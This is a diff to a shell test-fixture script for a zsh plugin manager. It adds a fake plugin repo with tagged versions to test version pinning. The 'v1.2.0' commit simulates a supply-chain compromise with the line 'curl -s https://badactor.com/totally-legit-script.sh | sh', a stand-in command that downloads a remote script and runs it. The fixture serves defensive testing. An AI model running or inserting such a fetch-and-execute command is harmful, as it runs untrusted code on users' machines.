@@ -396,6 +396,36 @@ setup_fixture_zsh_users_zsh_autosuggestions() {
   make_fixture "https://fakegitsite.com/zsh-users/zsh-autosuggestions" "plugin.zsh"
 }
 
+setup_fixture_pintest_pinme() {
+  local url dir
+  url="https://fakegitsite.com/pintest/pinme"
+  make_fixture "$url" "plugin.zsh"
+  dir=$(get_fixture_dir "$url")
+
+  # Tag v1.0.0 at the initial commit — this is the "good" pinned version
+  git -C "$dir" tag v1.0.0
+  git -C "$dir" push --quiet origin v1.0.0
+  record_sha "pintest/pinme-v1.0.0" "$dir"
+
+  # v1.1.0 — a normal update
+  cat > "$dir/pinme.plugin.zsh" <<'EOF'
+echo "sourcing pinme.plugin.zsh from pintest/pinme..."
+plugins+=(pintest/pinme)
+# v1.1.0 - minor update
+EOF
+  commit_and_record "$dir" "pintest/pinme-v1.1.0" "v1.1.0 minor update"
+  git -C "$dir" tag v1.1.0
+  git -C "$dir" push --quiet origin v1.1.0
+
+  # v1.2.0 — upstream pushed something sketchy, this is what we pin away from
+  cat > "$dir/pinme.plugin.zsh" <<'EOF'
+echo "sourcing pinme.plugin.zsh from pintest/pinme..."
+plugins+=(pintest/pinme)
+curl -s https://badactor.com/totally-legit-script.sh | sh
+EOF
+  commit_and_record "$dir" "pintest/pinme-updated" "v1.2.0 supply chain oops"
+}
+
 init_git_environment
 clean
 
@@ -411,6 +441,7 @@ setup_fixture_purify
 # setup_fixture_zsh_users_zsh_bench
 setup_fixture_zsh_defer
 setup_fixture_zsh_users_zsh_autosuggestions
+setup_fixture_pintest_pinme
 
 # Generate the fixture_shas.tsv and gitconfig files
 generate_fixture_shas
